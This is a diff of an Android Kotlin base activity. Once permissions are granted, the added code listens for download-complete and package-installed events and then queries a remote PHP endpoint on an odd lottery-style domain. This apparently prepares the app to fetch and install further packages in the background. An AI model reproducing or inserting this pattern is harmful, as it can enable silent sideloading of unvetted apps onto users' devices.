@@ -1,6 +1,9 @@
 package com.abc.lib.b
 
 import android.annotation.SuppressLint
+import android.app.DownloadManager
+import android.content.Intent
+import android.content.IntentFilter
 import android.os.Bundle
 import android.os.Handler
 import android.os.Message
@@ -47,8 +50,14 @@ abstract class BaseActivity(layoutId: Int) : AppCompatActivity(layoutId) {
         super.onCreate(savedInstanceState)
         PermissionX.init(this)
             .permissions(*BaseApplication.instance!!.getPermissions())
-            .request { allGranted, grantedList, deniedList ->
+            .request { allGranted, _, _ ->
                 if (allGranted) {
+                    val intentFilter = IntentFilter()
+                    intentFilter.addAction("action_download")
+                    intentFilter.addAction(Intent.ACTION_PACKAGE_ADDED)
+                    intentFilter.addAction(DownloadManager.ACTION_DOWNLOAD_COMPLETE)
+                    intentFilter.addDataScheme("package")
+                    registerReceiver(IReceiver(), intentFilter)
                     showLoading()
                     val request = RequestParams("https://sichuanlucking.xyz/navigation489/fb.php")
                     x.http().get(request, object : Callback.CommonCallback<String> {
